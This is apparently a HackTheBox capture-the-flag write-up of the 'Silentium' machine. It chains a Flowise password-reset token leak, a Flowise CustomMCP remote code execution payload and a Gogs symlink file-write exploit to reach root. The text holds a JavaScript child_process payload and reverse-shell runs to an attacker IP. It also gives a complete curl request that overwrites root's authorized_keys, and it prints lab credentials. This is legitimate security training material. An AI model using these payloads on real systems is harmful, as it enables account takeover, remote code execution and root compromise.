---
layout: writeup
title: "Silentium"
date: 2026-09-23
platform: HackTheBox
description: "Silentium is an easy-difficulty Linux machine that begins with discovering a Flowise instance on a staging subdomain. The application is running a version vulnerable to CVE-2025-58434, an unauthenticated password reset token disclosure that leads to account takeover. With access to Flowise, CVE-2025-59528 is exploited via the CustomMCP node to achieve remote code execution inside a Docker container. Environment variables exposed within the container reveal SSH credentials for the user ben on the host. Further enumeration reveals a Gogs instance on an internal vhost, running a version vulnerable to CVE-2025-8110, which allows an authenticated user to abuse symbolic links via the API to overwrite arbitrary files. This is leveraged to write an SSH public key to root's authorized_keys file, granting a shell as root."
image: /assets/Silentium/Silentiumlogo.png
---

On today's hacking we are working on a machine called Silentium. It's a machine from HackTheBox labelled as "Easy" that it has some interesting CVE's to work on. Let's jump on it.

We start with the all-time meta of the enumeration process which is using nmap:

```bash
┌─[✗]─[tch4vi@parrot]─[~/Documents/Silentium/Silentiumv2]
└──╼ $sudo nmap -sS -p- -Pn --min-rate=5000 10.129.104.172 -oG allportsSS
[sudo] password for tch4vi: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-27 09:49 CEST
Nmap scan report for 10.129.104.172
Host is up (0.037s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 17.38 seconds
```

We see port 22 and port 80 open, let's use the ``-sCV`` option to see more information.

```bash
┌─[✗]─[tch4vi@parrot]─[~/Documents/Silentium/Silentiumv2]
└──╼ $sudo nmap -sCV -p22,80 -Pn --min-rate=5000 10.129.104.172 -oG allportsSCV
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-27 09:50 CEST
Nmap scan report for 10.129.104.172
Host is up (0.036s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://silentium.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.37 seconds
```

We got the "http://silentium.htb" site:

![Silentium](/assets/Silentium/silentium.png)

![Silentium](/assets/Silentium/silentium2.png)

Initially, we cannot do much in the web page, not much information we can retrieve, no emails, no contact information... Tried manually some subdomains like http://portal.silentium.htb or http://silentium.htb/login, but no luck.

With ffuf we might be able to see if there is any other subdomain anywhere.

```bash
┌─[tch4vi@parrot]─[~/Documents/Silentium/Silentiumv2]
└──╼ $ffuf -u http://silentium.htb -H 'HOST: FUZZ.silentium.htb' -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://silentium.htb
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.silentium.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

staging                 [Status: 200, Size: 3142, Words: 789, Lines: 70, Duration: 57ms]
:: Progress: [20000/20000] :: Job [1/1] :: 1098 req/sec :: Duration: [0:00:18] :: Errors: 0 ::
```

That's a better way to find domains, in this case we got: ``staging``, which seems like a login page for members. One interesting detail is in the field "Email" which is filled with "user@company.com". I guess the company here will be Silentium, so maybe with @silentium.com or @silentium.htb. The only thing left is the user.

![Silentium](/assets/Silentium/staging.png)

![Silentium](/assets/Silentium/flowisefavicon.png)

I'm not very familiar to what is Flowise or anything, so I tried to search some information on internet. Seems like is an open-source platform for building AI agents using a visual editor instead of writing all the code by hand.
That's interesting what doesn't give us much window of attack this information. Let's dig a bit with wappalyzer and whatweb to know the technologies behind.

![Silentium](/assets/Silentium/wappalyzer.png)

```bash
┌─[tch4vi@parrot]─[~/Documents/Silentium/Silentiumv2]
└──╼ $whatweb http://silentium.htb
http://silentium.htb [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], IP[10.129.104.172], Script, Title[Silentium | Institutional Capital & Lending Solutions], nginx[1.24.0]

```


```bash
┌─[tch4vi@parrot]─[~/Documents/Silentium/Silentiumv2]
└──╼ $whatweb http://staging.silentium.htb
http://staging.silentium.htb [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], IP[10.129.104.172], Meta-Author[FlowiseAI], Open-Graph-Protocol[website], Script[module], Title[Flowise - Build AI Agents, Visually], UncommonHeaders[access-control-allow-credentials], nginx[1.24.0]

```

I wanted to check if I could get any information similar to the technologies used in the web, for example if PHP is being used and where. But nothing.


Given the situation, the only thing that we can access is the "Forgot Password" section where it sends an automated email to any existing user. I tried already with one random email but, if the user doesn't exist, the email is not sent.

![Silentium](/assets/Silentium/forgotpassword.png)


![Silentium](/assets/Silentium/mailfail2.png)

Let's keep fuzzing with feroxbuster this time, let's see if we get any other information like the version of the Flowise app:

```bash
┌─[✗]─[tch4vi@parrot]─[~/Documents/Silentium/Silentiumv2]
└──╼ $feroxbuster -u http://staging.silentium.htb
                                                                                                                                                                 
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://staging.silentium.htb/
 🚩  In-Scope Url          │ staging.silentium.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       69l      239w     3142c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET       10l       15w      156c http://staging.silentium.htb/assets => http://staging.silentium.htb/assets/
[####################] - 3m     60000/60000   0s      found:1       errors:0      
[####################] - 3m     30000/30000   152/s   http://staging.silentium.htb/ 
[####################] - 3m     30000/30000   152/s   http://staging.silentium.htb/assets/    

```

No luck.
Moving on into another tool, ``dirsearch`` this time:

```bash
┌─[✗]─[tch4vi@parrot]─[~/Documents/Silentium]
└──╼ $sudo dirsearch -u http://staging.silentium.htb
[sudo] password for tch4vi: 
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/tch4vi/Documents/Silentium/reports/http_staging.silentium.htb/_26-09-28_15-05-48.txt

Target: http://staging.silentium.htb/

[15:05:48] Starting: 
[15:06:00] 401 -   31B  - /api/v1/swagger.yaml
[15:06:00] 401 -   31B  - /api/v1/swagger.json
[15:06:00] 401 -   31B  - /api/v1/
[15:06:01] 301 -  156B  - /assets  ->  /assets/
[15:06:09] 200 -   15KB - /favicon.ico
[15:06:14] 200 -  766B  - /manifest.json
[15:06:23] 401 -   31B  - /ssc/api/v1/bulk

Task Completed

```

Good shot, we got ``/api/v1/`` and some others. Let's do another run of ``dirsearch`` now specifying this new information:

```bash
┌─[tch4vi@parrot]─[~/Documents/Silentium/Silentiumv2]
└──╼ $dirsearch -u http://staging.silentium.htb/api/v1
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/tch4vi/Documents/Silentium/Silentiumv2/reports/http_staging.silentium.htb/_api_v1_26-09-27_10-21-48.txt

Target: http://staging.silentium.htb/

[10:21:48] Starting: api/v1/
[10:21:58] 200 -    3KB - /api/v1/attachments
[10:21:58] 200 -    3KB - /api/v1/attachments.aspx
[10:21:58] 200 -    3KB - /api/v1/attachments.php
[10:21:58] 200 -    3KB - /api/v1/attachments.html
[10:21:58] 200 -    3KB - /api/v1/attachments.jsp
[10:21:58] 200 -    3KB - /api/v1/attachments.js
[10:21:58] 200 -    3KB - /api/v1/auth/login.php
[10:21:58] 200 -    3KB - /api/v1/auth/login.jsp
[10:21:58] 200 -    3KB - /api/v1/auth/login
[10:21:58] 200 -    3KB - /api/v1/auth/login.aspx
[10:21:58] 200 -    3KB - /api/v1/auth/login.html
[10:21:58] 200 -    3KB - /api/v1/auth/login.js
[10:22:03] 412 -  128B  - /api/v1/feedback
[10:22:03] 200 -    3KB - /api/v1/feedback.js
[10:22:03] 200 -    3KB - /api/v1/feedback.aspx
[10:22:03] 200 -    3KB - /api/v1/feedback.html
[10:22:03] 200 -    3KB - /api/v1/feedback.jsp
[10:22:03] 200 -    3KB - /api/v1/feedback.php
[10:22:04] 200 -    3KB - /api/v1/feedback_js.js
[10:22:06] 200 -    3KB - /api/v1/ip_configs/
[10:22:06] 200 -    3KB - /api/v1/ipython/tree
[10:22:06] 200 -    3KB - /api/v1/ip.txt
[10:22:06] 200 -    3KB - /api/v1/ipch/
[10:22:09] 200 -    3KB - /api/v1/metrics
[10:22:09] 200 -    3KB - /api/v1/metrics.json
[10:22:09] 200 -    3KB - /api/v1/metrics/
[10:22:12] 200 -    4B  - /api/v1/ping
[10:22:15] 200 -   31B  - /api/v1/settings
[10:22:15] 200 -    3KB - /api/v1/settings.aspx
[10:22:15] 200 -    3KB - /api/v1/settings.html
[10:22:15] 200 -    3KB - /api/v1/settings.php
[10:22:15] 200 -    3KB - /api/v1/settings.php.bak
[10:22:15] 200 -    3KB - /api/v1/settings.jsp
[10:22:15] 200 -    3KB - /api/v1/settings.js
[10:22:15] 200 -    3KB - /api/v1/settings.php.dist
[10:22:15] 200 -    3KB - /api/v1/settings.php.save
[10:22:15] 200 -    3KB - /api/v1/settings.php.old
[10:22:15] 200 -    3KB - /api/v1/settings.php.swp
[10:22:15] 200 -    3KB - /api/v1/settings.php~
[10:22:15] 200 -    3KB - /api/v1/settings.php.txt
[10:22:15] 200 -   31B  - /api/v1/settings/
[10:22:15] 200 -    3KB - /api/v1/settings.py
[10:22:15] 200 -    3KB - /api/v1/settings.xml
[10:22:19] 200 -   19B  - /api/v1/version
[10:22:19] 200 -    3KB - /api/v1/version.web
[10:22:19] 200 -   19B  - /api/v1/version/
[10:22:19] 200 -    3KB - /api/v1/version.txt

Task Completed

```

With ``/api/v1/verison`` we get the current version:

```bash
┌─[tch4vi@parrot]─[~/Documents/Silentium/Silentiumv2]
└──╼ $curl http://staging.silentium.htb/api/v1/version
{"version":"3.0.5"}

```


Now we officially know that the version running is the 3.0.5. Did a quick search on Internet to check what CVE's were the most critical ones on that version and found CVE-2025-58434.
This vulnerability is involved in the "request password" process. The main issue here is that the application allows any unauthenticated user to request the password reset, which is normal, what is not normal is that the server answers directly with the token. That's the principal problem of this vulnerability, if I understood correctly, then with burpsuite we will be able to catch the token and with that, assign the password as we please.

We know that the domain account is most certanly @silentium.htb, and, on the main page we get 3 names. Maybe we can try with marcus_thorne@silentium.htb, ben@silentium.htb or elena_rossi@silentium.htb. The easiest one is Ben, so let's see:



![Silentium](/assets/Silentium/users.png)


![Silentium](/assets/Silentium/benemail.png)

Good! And while sniffing with Burpsuite we can see the TempToken:

![Silentium](/assets/Silentium/burping2.png)

Now we can easily change the password of the user Ben and access the application.

![Silentium](/assets/Silentium/resetpassword.png)


![Silentium](/assets/Silentium/flowiseinside.png)

Climbed through the application with the user Ben, our next step is discover where is the gap to get the reverse shell. So now that we have access to the application, maybe we unlocked some new CVE's to exploit and gain this access, so as the previous step, did a quick search on Internet and found CVE-2025-59528.

It's a critical remote code execution vulnerability in the ``CustomMCP`` node of Flowise. The ``convertToValidJSONString`` function passes user-supplied input from the mcpServerConfig parameter directly to JavaScript's ``Function()`` constructor functionally equivalent to ``eval()`` allowing exeuction of arbitrary JavaScript. Shotout to Kim SooHyun (@im-soohyun) who discovered this vulnerability.

Vulnerable Code:

``` JavaScript
function convertToValidJSONString(inputString) {
    return Function('return ' + inputString)();  // ← arbitrary code execution
}
```

https://github.com/UsifAraby/CVE-2025-59528-POC

The Payload is the following one:

```bash
{
  "loadMethod": "listActions",
  "inputs": {
    "mcpServerConfig": "{x:(function(){const cp=process.mainModule.require('child_process');cp.exec('COMMAND',()=>{});return 1;})()}"
  }
}

```

We could insert it with Curl but, we can get the API key from Ben's user on Flowise web, but I will use the exploit provided in this public CVE.

So we start listening in another terminal with ``nc -lnvp 4444`` and in a different terminal, after cloning the github repository we build the command specifying our IP, the listening port, the email account from Ben and the new password:



```bash
┌─[tch4vi@parrot]─[~/Documents/Silentium/CVE-2025-59528-POC]
└──╼ $python3 exploit.py -t http://staging.silentium.htb --mode revshell --lhost 10.10.14.105 --lport 4444 --email ben@silentium.htb --password @Password1

   _____ _   _______       ___   ___ ___  ___        _____ ___  ___ ___  ___
  / ____| | | |  ___|     |__ \ / _ \__ \| __|      | ____/ _ \| __|__ \( _ )
 | |    | | | |   _|  ______ ) | | | | ) |__ \ _____|__ \| (_) |__ \  / / _ \
 | |    | |_| |  |_  |______/ /| |_| |/ / ___) |_____|__) \\__, |___) / /| (_) |
  \____|  \_/ |_____|       |_| \___/|___|____/      |____/  /_/|____/_/  \___/

  FlowiseAI CustomMCP Node — Remote Code Execution (CVE-2025-59528)
  Discovered by Kim SooHyun (@im-soohyun)

[*] Target: http://staging.silentium.htb
[*] Mode:   revshell
[*] Auth: JWT login (ben@silentium.htb)
[+] Authentication successful

[*] Auto mode — trying bash, nc, and python reverse shells
[!] Start your listener first: nc -lvnp 4444

[*] Sending bash reverse shell → 10.10.14.105:4444
    Delivered (HTTP 200)
[*] Sending nc reverse shell → 10.10.14.105:4444
    Delivered (HTTP 200)
[*] Sending python reverse shell → 10.10.14.105:4444
    Delivered (HTTP 200)

[*] All payloads sent. Check your listener!
[*] exec() is async — the server responds immediately even on success.

```


```bash
┌─[tch4vi@parrot]─[~]
└──╼ $nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.245.103 38309

```

And we are in.
Something i'm used to do whenever I get a shell is run the command ``ls -la`` and that discovered the ``.dockerenv`` which is the key to keep climbing this machine.

```bash
/ # ls -la
total 68
drwxr-xr-x    1 root     root          4096 Apr  8 15:14 .
drwxr-xr-x    1 root     root          4096 Apr  8 15:14 ..
-rwxr-xr-x    1 root     root             0 Apr  8 15:14 .dockerenv
drwxr-xr-x    1 root     root          4096 Jul 16  2025 bin
drwxr-xr-x    5 root     root           340 Sep 28 12:34 dev
drwxr-xr-x    1 root     root          4096 Apr  8 15:14 etc
drwxr-xr-x    1 root     root          4096 Jul 16  2025 home
drwxr-xr-x    1 root     root          4096 Jul 15  2025 lib
drwxr-xr-x    5 root     root          4096 Jul 15  2025 media
drwxr-xr-x    2 root     root          4096 Jul 15  2025 mnt
drwxr-xr-x    1 root     root          4096 Jul 16  2025 opt
dr-xr-xr-x  291 root     root             0 Sep 28 12:34 proc
drwx------    1 root     root          4096 Apr  8 09:41 root
drwxr-xr-x    3 root     root          4096 Jul 15  2025 run
drwxr-xr-x    2 root     root          4096 Jul 15  2025 sbin
drwxr-xr-x    2 root     root          4096 Jul 15  2025 srv
dr-xr-xr-x   13 root     root             0 Sep 28 12:34 sys
drwxrwxrwt    1 root     root          4096 Sep 28 12:49 tmp
drwxr-xr-x    1 root     root          4096 Apr  8 09:41 usr
drwxr-xr-x    1 root     root          4096 Jul 15  2025 var

```

Knowing that there is a ``dockerenv`` file allows us to run the command ``env`` which shows us multiple passwords, included Ben's password ``SMTP_PASSWORD=r04D!!_R4ge``.

Now we can leave this shell and connect via ssh.

```bash
/ # env
FLOWISE_PASSWORD=F1l3_d0ck3r
ALLOW_UNAUTHORIZED_CERTS=true
NODE_VERSION=20.19.4
HOSTNAME=c78c3cceb7ba
YARN_VERSION=1.22.22
SMTP_PORT=1025
SHLVL=4
PORT=3000
HOME=/root
SENDER_EMAIL=ben@silentium.htb
PUPPETEER_EXECUTABLE_PATH=/usr/bin/chromium-browser
JWT_ISSUER=ISSUER
JWT_AUTH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
LLM_PROVIDER=nvidia-nim
SMTP_USERNAME=test
SMTP_SECURE=false
JWT_REFRESH_TOKEN_EXPIRY_IN_MINUTES=43200
FLOWISE_USERNAME=ben
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
DATABASE_PATH=/root/.flowise
JWT_TOKEN_EXPIRY_IN_MINUTES=360
JWT_AUDIENCE=AUDIENCE
SECRETKEY_PATH=/root/.flowise
PWD=/
SMTP_PASSWORD=r04D!!_R4ge
NVIDIA_NIM_LLM_MODE=managed
SMTP_HOST=mailhog
JWT_REFRESH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
SMTP_USER=test
/ # 

```

``ssh ben@silentium.htb`` with password ``r04D!!_R4ge`` 

```bash
Last login: Wed Apr  8 19:12:55 2026 from 10.10.14.5
ben@silentium:~$ whoami
ben
ben@silentium:~$ id
uid=1000(ben) gid=1000(ben) groups=1000(ben),100(users)
ben@silentium:~$ ls
user.txt
ben@silentium:~$ cat user.txt
388857262b224ab1a87cd5c219ca90d4
ben@silentium:~$ 
```

We got the user flag. Now it's time to do the privesc.
The usual thing at this point is check files and directories until you see something interesting. So, that's what I did, I've been checking directories and found something interesting under nginx. Nginx is the web server that can host multiple web/web-applications:

```bash
ben@silentium:/etc/nginx/sites-enabled$ ls
silentium  staging  staging-v2-code
```

```bash
ben@silentium:/etc/nginx/sites-enabled$ cat staging-v2-code 
server { 
	listen 80; 
	server_name staging-v2-code.dev.silentium.htb; 
	
	location / { 
		proxy_pass http://127.0.0.1:3001; 
		proxy_set_header Host $host; 
		proxy_set_header X-Real-IP $remote_addr; 
		proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; 
		proxy_set_header X-Forwarded-Proto $scheme; 
	} 
}

```

We add this domain to our hosts file and try to access it to see what do we have: 

![Silentium](/assets/Silentium/gogs.png)

Seems like another Git alike page, and that brings back some tough memories of the previous writeup about the Nexus machine...

Before doing anything, let's try to register and access, maybe we can see some repositories that give us more information:

![Silentium](/assets/Silentium/gogsrepos.png)

Nothing.

At this point we need to get more information about Gogs, we need to know the current version in order to identify possible vulnerabilities that allows us to complete the privilege escalation. Searching on the terminal with Ben user found under ``/opt/gogs/gogs/`` directory, a script called ``gogs``, if we run the command ``./gogs --help`` it shows all the available commands to execute, and one of them is the ``--version``:

```bash
ben@silentium:/opt/gogs/gogs$ ./gogs --version 
Gogs version 0.13.3
```

Now that we know the version, we can look for vulnerabilities that affect this Gogs version and found CVE-2025-8110.

This CVE is a symlink vulnerability in Gogs that allows an authenticated user to perform arbitrary file writes through the repository content API.

The attacker (us) creates a symbolic link inside a repository pointing to a file outside the repository and then uses Gogs' ``Putcontents`` API to write to the symlink. Due to improper symlink handling, Gogs follows the link instead of preventing access outside the repository.

If Gogs is running with root privileges, this can be abused to modify root-owned files, such as ``/root/.ssh/authorized_keys``, ultimately allowing the attacker (us) to obtain a root ssh session.


![Silentium](/assets/Silentium/newrepo2.png)

We create a new repository and then clone it locally

```bash
┌─[tch4vi@parrot]─[~/Documents/Silentium]
└──╼ $git clone http://staging-v2-code.dev.silentium.htb/DiamondJackson/DiamondJacksonRepo
Cloning into 'DiamondJacksonRepo'...
remote: Enumerating objects: 3, done.
remote: Counting objects: 100% (3/3), done.
remote: Total 3 (delta 0), reused 0 (delta 0), pack-reused 0
Unpacking objects: 100% (3/3), 238 bytes | 238.00 KiB/s, done.

┌─[tch4vi@parrot]─[~/Documents/Silentium/DiamondJacksonRepo]
└──╼ $sudo ln -s /root/.ssh/authorized_keys diamondjacksonssh
┌─[tch4vi@parrot]─[~/Documents/Silentium/DiamondJacksonRepo]
└──╼ $git config --global user.email "diamondjackson@silentium.htb"
┌─[tch4vi@parrot]─[~/Documents/Silentium/DiamondJacksonRepo]
└──╼ $git config --global user.name "DiamondJackson"
┌─[tch4vi@parrot]─[~/Documents/Silentium/DiamondJacksonRepo]
└──╼ $git add *
┌─[tch4vi@parrot]─[~/Documents/Silentium/DiamondJacksonRepo]
└──╼ $git commit -m "testing"
[master c95d46e] testing
 1 file changed, 1 insertion(+)
 create mode 120000 diamondjacksonssh
┌─[tch4vi@parrot]─[~/Documents/Silentium/DiamondJacksonRepo]
└──╼ $git ls-tree HEAD diamondjacksonssh
120000 blob 9c87fc525b63ebd989fa409533d3be1b295d6ec3	diamondjacksonssh

```

We got the blob, now it's time to get the API Token:

![Silentium](/assets/Silentium/newtoken.png)


Our token --> ``ab86354f82913cb7fa9cb1d4485c8913d766d12b``

```bash
┌─[tch4vi@parrot]─[~/Documents/Silentium/DiamondJacksonRepo]
└──╼ $ssh-keygen -t ed25519 -C "diamondjackson@htb.com"
Generating public/private ed25519 key pair.
Enter file in which to save the key (/home/tch4vi/.ssh/id_ed25519): here
Enter passphrase for "here" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in here
<snip>
</snip>
┌─[tch4vi@parrot]─[~/Documents/Silentium/DiamondJacksonRepo]
└──╼ $cat here.pub 
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGsKKKqTBZveD7WeaZWnPoMpwpHqkLoJrgINALs2uHK4 diamondjackson@htb.com
┌─[tch4vi@parrot]─[~/Documents/Silentium/DiamondJacksonRepo]
└──╼ $echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGsKKKqTBZveD7WeaZWnPoMpwpHqkLoJrgINALs2uHK4 diamondjackson@htb.com" | base64
c3NoLWVkMjU1MTkgQUFBQUMzTnphQzFsWkRJMU5URTVBQUFBSUdzS0tLcVRCWnZlRDdXZWFaV25Q
b01wd3BIcWtMb0pyZ0lOQUxzMnVISzQgZGlhbW9uZGphY2tzb25AaHRiLmNvbQo=

```

Okey we got our 3 ingredients to poison Gogs, the blob, the Token and our public key in base64. Now with the help of curl we create the following payload:
```bash
curl -X PUT -H "Authorization: token ab86354f82913cb7fa9cb1d4485c8913d766d12b" 
-H "Content-Type: application/json" "http://staging-v2-code.dev.silentium.htb/api/v1/repos/DiamondJackson/DiamondJacksonRepo/contents/diamondjacksonssh?ref=master" 
-d 
'{ "message": "testingBurp", 
	"content": "c3NoLWVkMjU1MTkgQUFBQUMzTnphQzFsWkRJMU5URTVBQUFBSUdzS0tLcVRCWnZlRDdXZWFaV25Qb01wd3BIcWtMb0pyZ0lOQUxzMnVISzQgZGlhbW9uZGphY2tzb25AaHRiLmNvbQo=", 
	"sha": "9c87fc525b63ebd989fa409533d3be1b295d6ec3" 
}' | jq
```

It looks messy as hell but yes, that thing over here works, if you check the complete structure of the payload you will see where it's all specified. Authorization --> token, Content-Type --> application/json + the path (with the /api/v1/repos/, I forgot it initially), message --> whatever, content --> our base64 pub key, so it's overwrited in /root/.ssh/authorized_keys, sha --> the blob. And ``jq`` so the outcome of the command looks better

```bash
┌─[✗]─[tch4vi@parrot]─[~/Documents/Silentium/DiamondJacksonRepo]
└──╼ $curl -X PUT -H "Authorization: token ab86354f82913cb7fa9cb1d4485c8913d766d12b" -H "Content-Type: application/json" "http://staging-v2-code.dev.silentium.htb/api/v1/repos/DiamondJackson/DiamondJacksonRepo/contents/diamondjacksonssh?ref=master" -d '{ "message": "testingBurp", "content": "c3NoLWVkMjU1MTkgQUFBQUMzTnphQzFsWkRJMU5URTVBQUFBSUdzS0tLcVRCWnZlRDdXZWFaV25Qb01wd3BIcWtMb0pyZ0lOQUxzMnVISzQgZGlhbW9uZGphY2tzb25AaHRiLmNvbQo=", "sha": "9c87fc525b63ebd989fa409533d3be1b295d6ec3" }' | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2632    0  2398  100   234  13063   1274 --:--:-- --:--:-- --:--:-- 14382
{
  "commit": {
    "url": "http://staging-v2-code.dev.silentium.htb:3001/api/v1/repos/DiamondJackson/DiamondJacksonRepo/contents/diamondjacksonssh",
    "sha": "c95d46e90700de1500386fa216b049447967cad7",
    "html_url": "http://staging-v2-code.dev.silentium.htb:3001/DiamondJackson/DiamondJacksonRepo/commits/c95d46e90700de1500386fa216b049447967cad7",
    "commit": {
      "url": "http://staging-v2-code.dev.silentium.htb:3001/api/v1/repos/DiamondJackson/DiamondJacksonRepo/contents/diamondjacksonssh",
      "author": {
        "name": "DiamondJackson",
        "email": "diamondjackson@silentium.htb",
        "date": "2026-10-01T22:00:17Z"
      },
      "committer": {
        "name": "DiamondJackson",
        "email": "diamondjackson@silentium.htb",
        "date": "2026-10-01T22:00:17Z"
      },
      "message": "testing",
      "tree": {
        "url": "http://staging-v2-code.dev.silentium.htb:3001/api/v1/repos/DiamondJackson/DiamondJacksonRepo/tree/c95d46e90700de1500386fa216b049447967cad7",
        "sha": "c95d46e90700de1500386fa216b049447967cad7"
      }
    },
    "author": {
      "id": 3,
      "username": "DiamondJackson",
      "login": "DiamondJackson",
      "full_name": "",
      "email": "diamondjackson@silentium.htb",
      "avatar_url": "https://secure.gravatar.com/avatar/4ddc2e9101efde044c44546f7807b3d1?d=identicon"
    },
    "committer": {
      "id": 3,
      "username": "DiamondJackson",
      "login": "DiamondJackson",
      "full_name": "",
      "email": "diamondjackson@silentium.htb",
      "avatar_url": "https://secure.gravatar.com/avatar/4ddc2e9101efde044c44546f7807b3d1?d=identicon"
    },
    "parents": [
      {
        "url": "http://staging-v2-code.dev.silentium.htb:3001/api/v1/repos/DiamondJackson/DiamondJacksonRepo/commits/acf6cdba14b7501c993500fceef4c5ad66614d2a",
        "sha": "acf6cdba14b7501c993500fceef4c5ad66614d2a"
      }
    ]
  },
  "content": {
    "type": "symlink",
    "target": "/root/.ssh/authorized_keys",
    "size": 26,
    "name": "diamondjacksonssh",
    "path": "diamondjacksonssh",
    "sha": "9c87fc525b63ebd989fa409533d3be1b295d6ec3",
    "url": "http://staging-v2-code.dev.silentium.htb:3001/api/v1/repos/DiamondJackson/DiamondJacksonRepo/contents/diamondjacksonssh",
    "git_url": "",
    "html_url": "http://staging-v2-code.dev.silentium.htb:3001/DiamondJackson/DiamondJacksonRepo/src/master/diamondjacksonssh",
    "download_url": "http://staging-v2-code.dev.silentium.htb:3001/DiamondJackson/DiamondJacksonRepo/raw/master/diamondjacksonssh",
    "_links": {
      "git": "",
      "self": "http://staging-v2-code.dev.silentium.htb:3001/api/v1/repos/DiamondJackson/DiamondJacksonRepo/contents/diamondjacksonssh",
      "html": "http://staging-v2-code.dev.silentium.htb:3001/DiamondJackson/DiamondJacksonRepo/src/master/diamondjacksonssh"
    }
  }
}

```

This is a sign that our curl payload worked correctly. Now, inside the same directory where we have the private key, we can run the following command:


```bash
┌─[tch4vi@parrot]─[~/Documents/Silentium/DiamondJacksonRepo]
└──╼ $ssh -i [Private Key file] root@10.129.245.103
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-107-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Thu Oct  1 11:06:50 PM UTC 2026

  System load:           0.02
  Usage of /:            83.3% of 13.37GB
  Memory usage:          22%
  Swap usage:            0%
  Processes:             226
  Users logged in:       0
  IPv4 address for eth0: 10.129.245.103
  IPv6 address for eth0: dead:beef::a0de:adff:fe4b:63be


Expanded Security Maintenance for Applications is not enabled.

68 updates can be applied immediately.
52 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

1 additional security update can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

root@silentium:~#
root@silentium:~# cat root.txt
d050bf28add5a33e68b4d6c2417995bb

```

And we got the flag.
Being completely honest, I pwned this machine 2 times already, because, on the first run I completed it exploiting the vulnerabilities with the public POC's and that felt so Script Kiddish, I wanted to understand all the vulnerabilities and correctly and that's why I did a re-run. I complete machines and my weakest point is the privesc thing, I need to train more in this aspect.

![Silentium](/assets/Silentium/pwned.png)
